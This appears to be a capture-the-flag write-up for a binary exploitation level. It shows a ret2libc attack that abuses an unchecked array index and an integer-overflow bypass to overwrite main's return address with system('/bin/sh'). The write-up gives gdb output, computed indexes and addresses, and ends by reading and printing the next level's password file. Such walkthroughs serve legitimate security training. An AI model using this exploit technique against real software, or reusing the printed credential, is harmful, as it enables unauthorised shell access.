This level has an interactive program that creates an int array[100] with 3 options: read, store, quit.
Read = read_number(array) will simply get an index unsigned int from input using scanf and then prints array[index] or (array + index * 4 {since int has a size of 4 bytes})
Store = store_number(array) will get an index and value from input using scanf and will set array[index] = value or (array + index * 4 = value)
quit = will exit the loop and return

the trick in this level is in the store function, it is not secure because it has no limits and can let us print any value on memory we only have to get the correct index for this memory.

let's try overwriting the return address of main with ret2libc system("bin/sh"), but first let's get the return address first we can get it using:

info frame
Stack level 0, frame at 0xffffd6f0:
 eip = 0x80488ea in main; saved eip 0xf7e45513
 Arglist at 0xffffd6e8, args:
 Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
 Saved registers:
  ebx at 0xffffd6dc, ebp at 0xffffd6e8, esi at 0xffffd6e0, edi at 0xffffd6e4, **eip at 0xffffd6ec**

0xffffd6ec is the return address we're looking for to overwrite.

now if we want to write anything on this address we'll have to guess its index, we can do that by substracting it from the array address, we can get the array address by breaking before read_number() or store_number()
and checking the $esp since it's passed as an argument.

b *0x080488ea // (0x080488ea <+455>:	call   0x8048630 <store_number>)
x/wx $esp
0xffffd500:	**0xffffd524**

now we can substract it from the return address then divide it by 4 to get the index :

(0xffffd6ec - 0xffffd524) =  456 (This is the distance between the array and the return address)
if we divide it by 4 we will get the index 114.

now that we have the index, we can write the system address on that index (114), the next 4 bytes are insignificant (115), and the next 4 bytes should contain the "/bin/sh" (116), address we can get that as usual

(gdb) p system
$1 = {<text variable, no debug info>} **0xf7e6aed0** <system>

(gdb) find 0xf7e2c000,0xf7fcc000, "/bin/sh"
**0xf7f897ec**

There's still a twist in store_number(), the function checks if the index % 3 != 0 before writing, if not it will say that the index is reserved for wil and since 114 % 3 == 0 it isn't possible to store a value in that index. Luckily we can get around this limitation using integer overflow, since memory is circular we can get another number that stores in the same index by doing a lap :
(0x100000000 + 0x1c8) / 4 = 1073741938 // 456 = 0x1c8

now we will store:

1073741938 (114) = 4159090384 // 0xf7e6aed0 (system)
116 = 4160264172 // 0xf7f897ec ("/bin/sh")

now we when quitting, main() will reach its return then our system("/bin/sh") will get called instead.

$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC